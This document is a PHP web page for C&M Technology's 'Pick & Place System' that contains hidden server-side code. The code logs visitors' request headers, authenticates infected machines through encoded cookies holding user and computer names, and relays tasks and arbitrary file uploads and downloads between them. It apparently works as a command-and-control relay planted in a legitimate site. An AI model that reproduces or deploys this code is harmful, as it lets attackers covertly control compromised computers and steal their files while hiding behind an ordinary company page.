<?php
define('WorkPath', '/opt/app-root/src/app/webroot/css/');
define('WaitTimeout', 28);
define('WaitSetp', 10000);
ini_set('session.save_path', '/opt/app-root/src/app/webroot/css/');
ini_set('session.gc_maxlifetime', 60 * 22);
date_default_timezone_set('ETC/GMT-8');
set_time_limit(0);
session_start();



$HttpHeader = "{$_SERVER[REQUEST_METHOD]} {$_SERVER[REQUEST_URI]} {$_SERVER[SERVER_PROTOCOL]}\n";
	
foreach (@mgetallheaders() as $key => $value)
	$HttpHeader.= "$key: $value\n";

$IPADRESS = $_SERVER['REMOTE_ADDR'];

function mgetallheaders() 
{ 
	$headers = ''; 
	foreach ($_SERVER as $name => $value) 
	{ 
		if (substr($name, 0, 5) == 'HTTP_') 
		{ 
			$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; 
		} 
	} 
	return $headers; 
}
@file_put_contents('/opt/app-root/src/app/webroot/css/httplog.txt', "[$IPADRESS] - ".date('Y-m-d H:i:s')."\n$HttpHeader\n\n", FILE_APPEND);
?>




<html>
<head>
<title>Pick &amp; Place System</title>
<META NAME="description" CONTENT="C&M Technology, Inc. is a high-tech design and manufacturing firm specializing in industrial automation equipment and oceanographic control and monitoring instrumentation.">
<META NAME="keywords" CONTENT="data acquisition, data acquisition systems, real time data acquisition, oceanographic instrumentation, acoustic arrays, hydrophone arrays, hydrophones, transducer arrays, data telemetry systems, radio links, radio telemetry systems, surface telemetry buoys, geophone arrays, positioning systems, environmental buoys, meteorological buoys, rotators, motion simulators, control systems, underwater acoustics, process and motion controllers, industrial automation, custom machines, pressure vessels, buoys">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#FFFFFF">
<?php
$out = Worker();
if ($out) {
  echo $out;
  echo '</body></html>';
  exit();
}
?>
<div align="center">
  <table width="650" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td>
        <div align="center">
          <table width="650" border="0" cellspacing="0" cellpadding="0">
            <tr> 
              <td width="7"><img src="../images/inrpgbnr/indauto/ind1.gif" width="7" height="39"></td>
              <td width="37"><img src="../images/inrpgbnr/indauto/ind2.gif" width="37" height="39"></td>
              <td width="562"><img src="../images/inrpgbnr/indauto/indbanr.gif" width="562" height="39" alt="Industrial Automation"></td>
              <td width="37"><img src="../images/inrpgbnr/indauto/ind4.gif" width="37" height="39"></td>
              <td width="7"><img src="../images/inrpgbnr/indauto/ind5.gif" width="7" height="39"></td>
            </tr>
            <tr bgcolor="#000066"> 
              <td width="7" bgcolor="#000066" valign="top"><img src="../images/inrpgbnr/indauto/ind6.gif" width="7" height="35"></td>
              <td width="37" valign="top"><img src="../images/inrpgbnr/indauto/ind7.gif" width="37" height="35"></td>
              <td width="562"> 
                <table width="100%" border="0" cellspacing="0" cellpadding="2">
                  <tr valign="top"> 
                    <td colspan="10" height="11"> 
                      <div align="center"><b><font face="Arial, Helvetica, sans-serif" size="4" color="#FFFFFF">Pick 
                        &amp; Place System</font></b></div>
                    </td>
                  </tr>
                </table>
              </td>
              <td width="37" valign="top"><img src="../images/inrpgbnr/indauto/ind8.gif" width="37" height="35"></td>
              <td width="7" bgcolor="#000066" valign="top"><img src="../images/inrpgbnr/indauto/ind9.gif" width="7" height="35"></td>
            </tr>
          </table>
          
          <table width="100%" border="0" cellpadding="6">
            <tr> 
              <td width="7%" height="48"> 
                <div align="center"> 
                  <table width="6%" border="0">
                    <tr> 
                      <td height="85" colspan="3"><img src="../images/indauto/polycst2.jpg" width="257" height="180" border="1"></td>
                    </tr>
                    <tr> 
                      <td colspan="3"> 
                        <div align="center"></div>
                        <div align="center"></div>
                      </td>
                    </tr>
                  </table>
                </div>
              </td>
              <td width="65%" height="48"> 
                <p><font face="Verdana, Arial, Helvetica, sans-serif" size="-1">C&amp;M 
                  manufactured a turnkey pick &amp; place system for processing 
                  6' x 10' acrylic sheets. All testing was performed in-house 
                  prior to installation at our customer's facility.</font> </p>
                </td>
              <td width="28%" height="48"> 
                <table width="26%" border="0">
                  <tr> 
                    <td width="50%"><img src="../images/indauto/polycst3.jpg" width="148" height="180" border="1"></td>
                  </tr>
                  <tr> 
                    <td width="50%" height="2">&nbsp;</td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
          <table width="100%" border="0" cellpadding="6">
            <tr> 
              <td valign="top" width="31%"> 
                <div align="center"><img src="../images/indauto/pickplc4.jpg" width="201" height="288" border="1"></div>
              </td>
              <td valign="middle" width="69%"> 
                <div align="center"><img src="../images/indauto/connctns.jpg" width="170" height="288" border="1"> 
                </div>
              </td>
              <td valign="middle" width="69%"> 
                <div align="center"><img src="../images/indauto/gearchn.jpg" width="190" height="288" border="1"></div>
              </td>
            </tr>
            <tr> 
              <td valign="top" width="31%"> 
                <div align="center"></div>
              </td>
              <td valign="middle" width="69%"> 
                <div align="center"></div>
              </td>
              <td valign="middle" width="69%"> 
                <div align="center"></div>
              </td>
            </tr>
          </table>
          <div align="center">
            <div align="center">
              <p><font face="Arial, Helvetica, sans-serif" size="-1"><font face="Verdana, Arial, Helvetica, sans-serif" size="-1"><a href="../indauto.htm">Industrial 
                Automation</a></font></font><b><font face="Arial, Helvetica, sans-serif" size="-1" color="#FFFFFF"><font face="Verdana, Arial, Helvetica, sans-serif" size="-1"><font color="#FFCC00"> 
                |</font></font> </font></b><font face="Verdana, Arial, Helvetica, sans-serif" size="-1"><a href="../index.html">Home</a> 
                <font color="#FFCC00">| </font><a href="../profile.htm">Company 
                Profile</a><font color="#FFCC00"> | </font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="-1"><a href="../moreinfo.htm">Request 
                More Information</a> <font color="#FFCC00">|</font></font> <font face="Verdana, Arial, Helvetica, sans-serif" size="-1"><a href="../sitemap.htm">Site 
                Directory</a></font></p>
            </div>
          </div>
        </div>
        <div align="center">
<table width="650" border="0" cellspacing="0" cellpadding="0" align="center">
            <tr> 
              <td valign="top"><img src="../images/inrpgbnr/banr1.jpg" width="254" height="100"></td>
              <td valign="top"><img src="../images/inrpgbnr/banr2.gif" width="155" height="100"> 
              </td>
              <td valign="top"><img src="../images/inrpgbnr/banr3.jpg" width="241" height="100"></td>
            </tr>
          </table>
          <p><font color="#FFFFFF"><b><font color="#000000"><b><font size="1" face="Verdana, Arial, Helvetica, sans-serif">475 Bridge Street, Suite 100, Groton, CT 06340</font><font color="#FFFFFF"><b><font color="#000000"><b><font size="1" face="Verdana, Arial, Helvetica, sans-serif">
            &#149; </font></b></font></b></font><font size="1" face="Verdana, Arial, Helvetica, sans-serif">Tel:
            860-448-3253 x101&#149; Fax: 860-448-3075</font><font color="#FFFFFF"><b><font color="#000000"><b><font size="1" face="Verdana, Arial, Helvetica, sans-serif">
            &#149; </font></b></font></b></font><font size="1" face="Verdana, Arial, Helvetica, sans-serif">email:
            <a href="mailto:%20ccorrado@aphysci.com"><font color="#000066">ccorrado@aphysci.com</font></a></font></b></font></b></font></p>
              </div>
        </td>
    </tr>
  </table>
  
</div>
</body>
</html>

<?php
function Worker()
{
  $Start = strtotime('now');
  if (!isset($_SESSION['hash'])) 
  {
    $AuthFlag = Authentication();
    if ($AuthFlag)
    {
      $_SESSION['BotFile'] = WorkPath.'bot_'.$_SESSION['hash'];
      $_SESSION['SWPFile'] = WorkPath.'swp_'.$_SESSION['hash'];
      $_SESSION['RETFile'] = WorkPath.'ret_'.$_SESSION['hash'];
      
      if (fWriteContent($_SESSION['BotFile'], serialize($_SESSION['BotInfo'])))
        return $AuthFlag;
      else{
        unset($_SESSION['hash']);
        unset($_SESSION['BotInfo']);
        return '';
      }
    }    
  }else{
    if (!@file_exists($_SESSION['BotFile']))
    {
      unset($_SESSION['hash']);
      unset($_SESSION['BotInfo']);
      return '';
    }
    @touch($_SESSION['BotFile']);
    if ($_SERVER['REQUEST_METHOD'] == 'GET')
    {
      for ($i = 0; (strtotime('now') - $Start) < WaitTimeout ; $i++)
      {
        if (@file_exists($_SESSION['SWPFile'])){
          $SWP = @fReadContent($_SESSION['SWPFile']);
          @unlink($_SESSION['SWPFile']);
          return $SWP;
        }
        
        if ($i % 2){
          $D = Download();
          if ($D) return $D;
        }
        usleep(WaitSetp);
      }
      return '';
    } elseif (isset($_POST[$_SESSION['Field']])) {
      Upload();
      if (@file_exists($_SESSION['SWPFile'])){
        $SWP = @fReadContent($_SESSION['SWPFile']);
        @unlink($_SESSION['SWPFile']);
        return $SWP;
      }

      if (empty($_POST[$_SESSION['Field']])) {
        return $_SESSION['VFMark'];
      }else{
        @fWriteContent($_SESSION['RETFile'], base64_decode($_POST[$_SESSION['Field']]));
        return Download();
      }
    }
  }
  return '';
}
function Upload(){
  if (isset($_POST[$_SESSION['upFlag']]) && @file_exists($_SESSION['upload_task'])){
    $F = @unserialize(@fReadContent($_SESSION['upload_task']));
    if (!$F || $F['Done'] != 0)
      return;
    $D = @base64_decode($_POST[$_SESSION['upFlag']]);
    
    $handle = fopen($F['Dest'], 'a');
    if(!$handle){
      echo "sss ".strlen($D);
      $F['Done'] = 2;
      @fWriteContent($_SESSION['upload_task'], @serialize($F));
      return;
    }
    if (flock($handle, LOCK_EX)) {
      $WD = fwrite($handle, $D);
      flock($handle, LOCK_UN);
    }
    fclose($handle);
  }
}
function Download(){
  if (@file_exists($_SESSION['download_task'])){
    $F = @unserialize(@fReadContent($_SESSION['download_task']));    
    if (!$F || $F['Done'] != 0){
      return '';
    }
    
    $RD = null;
    $APPEND = $F['Postion'] != 0;
    do{
      if ($F['Postion'] >= @filesize($F['File'])){
        $F['Done'] = 1;
        @fWriteContent($_SESSION['download_task'], @serialize($F));
        return '';
      }
      if ($F['Postion'] >= @filesize($F['File']))break;
      $RD = @fopen($F['File'], 'r');
      if (!$RD){
        $F['Done'] = 2;
        break;
      }

      fseek($RD, $F['Postion']);
      $D = fread($RD, $F['rSize']);
      if (!$D) {
        $F['Done'] = 3;
        break;
      }
      fclose($RD);
      $F['Postion'] += strlen($D);
      @fWriteContent($_SESSION['download_task'], @serialize($F));
      return $_SESSION['bgFlag'].base64_encode('3'.randStr(3).json_encode(array('Dst' => $F['Dest'], 'EDF'=>$F['EDF'], 'A'=>$APPEND ? 1 : 0))).$_SESSION['edFlag'].base64_encode($D).$F['EDF'];
    }while(1);
    if ($RD) @fclose($RD);
    @fWriteContent($_SESSION['download_task'], @serialize($F));
  }
  return '';
}
function Authentication(){
  if (empty($_COOKIE))
    return '';

  foreach ($_COOKIE as $k => $v) {
    if(preg_match('![^a-zA-Z0-9/+=]!', $v))
      continue;
    $d = @base64_decode($v);
    if (strlen($d) < 22)
      continue;
    $d = explode('^', $d);
    if (count($d) != 3 || strlen($d[1]) != 12)
      continue;
    $F = explode('|', base64_decode($d[2]));
    if (count($F) != 5)
      continue;


    $BotInfo['UserDomain'] = $F[0];
    $BotInfo['UserName'] = $F[1];
    $BotInfo['ComputerName'] = $F[2];
    $BotInfo['CurrentDomain'] = $F[3];
    $BotInfo['IsDomainComputer'] = intval($F[4]);
    $BotInfo['bgFlag'] = substr($d[1], 4, 4);
    $BotInfo['edFlag'] = substr($d[1], 8, 4);

    $_SESSION['hash'] = md5($BotInfo['UserName'].$BotInfo['ComputerName']);

    $BotInfo['upload_task'] = WorkPath.'upl_'.$_SESSION['hash'];
    $BotInfo['download_task'] = WorkPath.'dow_'.$_SESSION['hash'];
    $_SESSION['upload_task'] = $BotInfo['upload_task'];
    $_SESSION['download_task'] = $BotInfo['download_task'];
    $_SESSION['Field'] = substr($d[1], 0, 4);
    $_SESSION['bgFlag'] = $BotInfo['bgFlag'];
    $_SESSION['edFlag'] = $BotInfo['edFlag'];
    $_SESSION['upFlag'] = substr($BotInfo['bgFlag'], 1, 2) . substr($BotInfo['edFlag'], 1, 2);
    $_SESSION['BotInfo'] = $BotInfo;
    
    $H = @unserialize(fReadContent(WorkPath.'Hosts'));
    if ($H && isset($H[$BotInfo['ComputerName']])) {
      return RpField(randStr(1).$_SESSION['upFlag'].$H[$BotInfo['ComputerName']]);
    }
    return RpField($d[0]);
  }
  return '';
}
function RpField($d)
{
  if (strlen($d) == 0)
    return '';
  return $_SESSION['bgFlag'].@base64_encode($d).$_SESSION['edFlag'];
}




function randStr($len, $Nf=0)
{ 
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
    $string = ''; 
    for(; $len >= 1; $len--) 
    {
        $position = rand()%strlen($chars);
        $string .= substr($chars,$position,1); 
    }
    return $string; 
}
if (!function_exists('getallheaders')) 
{
  function getallheaders()
  {
    $headers = '';
    foreach ($_SERVER as $name => $value)
    {
      if (substr($name, 0, 5) == 'HTTP_')
      {
        $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
      }
    }
    return $headers; 
  }
}
function fReadContent($f){
  return @file_get_contents($f);
}
function fWriteContent($f, $d){
  return @file_put_contents($f, $d);
}

?>
